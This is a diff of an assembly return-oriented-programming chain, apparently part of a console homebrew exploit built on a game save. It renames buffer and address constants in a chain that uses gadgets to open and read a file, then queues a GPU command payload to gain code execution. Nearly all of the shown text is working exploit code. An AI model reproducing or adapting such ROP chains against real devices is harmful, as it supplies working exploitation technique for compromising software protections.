@@ -3,7 +3,7 @@ rop:
 	.word ROP_IRON_POP_R0PC
 		.word IRON_FS_HANDLE ; r0 (fs handle)
 	.word ROP_IRON_POP_R1PC
-		.word SAVE0_BUFFER_PTR + file_handle ; r1 (file handle)
+		.word IRON_SAVE0_BUFFER_PTR + file_handle ; r1 (file handle)
 	.word ROP_IRON_POP_R2R3R4R5R6PC
 		.word 0x00000000 ; r2 (transaction)
 		.word 0x00000004 ; r3 (archive id)
@@ -15,14 +15,14 @@ rop:
 		.word DUMMY_PTR ; sp+4 : *archive_path
 		.word 0x00000001 ; sp+8 : archive_path_length
 		.word 0x00000003 ; sp+0xC : path_type (PATH_CHAR)
-		.word SAVE0_BUFFER_PTR + file_path ; sp+0x10 : *path
+		.word IRON_SAVE0_BUFFER_PTR + file_path ; sp+0x10 : *path
 		.word file_path_end - file_path ; sp+0x14 : pathlength
 		.word 0x00000001 ; sp+0x18 : openflags
 		.word 0x00000000 ; sp+0x1c : attributes
 
 	set_lr ROP_IRON_POP_R4R5PC
 	.word ROP_IRON_POP_R0PC
-		.word SAVE0_BUFFER_PTR + file_handle ; r0 (file handle)
+		.word IRON_SAVE0_BUFFER_PTR + file_handle ; r0 (file handle)
 	.word ROP_IRON_POP_R1PC
 		.word DUMMY_PTR ; r1 (bytes read)
 	.word ROP_IRON_POP_R2R3R4R5R6PC
@@ -39,9 +39,9 @@ rop:
 
 	set_lr ROP_IRON_NOP
 	.word ROP_IRON_POP_R0PC ; pop {r0, pc}
-		.word 0x00349C40 + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
+		.word IRON_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
 	.word ROP_IRON_POP_R1PC ; pop {r1, pc}
-		.word SAVE0_BUFFER_PTR + gxCommandPayload ; r1 (cmd addr)
+		.word IRON_SAVE0_BUFFER_PTR + gxCommandPayload ; r1 (cmd addr)
 	.word IRON_GSPGPU_GXTRYENQUEUE
 
 	sleep 100*1000*1000, 0
